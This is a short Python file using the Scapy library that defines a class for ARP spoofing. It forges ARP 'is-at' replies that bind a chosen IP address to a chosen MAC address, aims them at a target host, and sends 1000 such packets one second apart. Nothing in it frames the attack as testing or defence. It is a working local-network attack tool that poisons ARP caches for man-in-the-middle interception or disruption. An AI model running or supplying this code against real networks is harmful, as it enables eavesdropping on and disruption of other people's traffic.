from scapy.all import ARP, Ether
from scapy.sendrecv import sendp

class spoof(object):
    def __init__(self, ip, mac):
        ether = Ether()
        ether.src = mac # Default: network card mac
        
        arp = ARP()
        arp.op = arp.is_at
        arp.psrc = ip
        arp.hwsrc = mac
        
        self.arp = arp
        self.ether = ether
        
    def setTarget(self, targetIP, targetMAC):
        self.arp.pdst = targetIP # Default: 0.0.0.0
        self.arp.hwdst = targetMAC # Default: 00:00:00:00:00:00
        
        self.ether.dst = targetMAC # Default: ff:ff:ff:ff:ff:ff
        
    def prepare(self):
        self.packet = self.ether/self.arp
        
    def run(self):
        self.prepare()
        self.packet.show()
        sendp(x=self.packet, inter=1, count=1000)
